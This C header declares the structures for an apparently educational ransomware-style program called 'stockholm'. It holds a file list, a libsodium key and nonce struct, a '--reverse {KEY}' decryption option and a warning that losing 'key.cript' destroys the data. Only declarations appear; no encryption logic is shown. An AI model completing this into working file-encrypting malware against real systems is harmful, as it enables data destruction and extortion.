#ifndef STOCKHOLM_H
#define STOCKHOLM_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sodium.h>
#include <dirent.h>
#include <sys/types.h>
#include <strings.h>

#define STOCKHOLM_VERSION "0.2"
#define DEFAULT_HELP "Usage : ./stockholm [OPTION]\nTry -h or --help for details :>\n"
#define HELP "Usage : ./stockholm [OPTION]\n\n\
Options :\n\t\
-h, --help\t\tDisplay every option available\n\t\
-v, --version\t\tDisplay the version of the program\n\t\
-r, --reverse {KEY}\tReverse every encrypted file \n"

#define FILE_DELETED "\033[1;31mIf you delete key.cript file, your data will be lost forever.\033[0m"

struct linkedFile{
	char file[256];
	struct linkedFile *next;
};

struct cryptFile{
	char key[crypto_secretbox_KEYBYTES];
	char nonce[crypto_secretbox_NONCEBYTES];
};

int		optionprog(char *option, int argc);
struct linkedFile	*openFile(void);

void	clearlist(struct linkedFile **toclear);
void	addback_node(struct linkedFile **node, char filename[256]);

#endif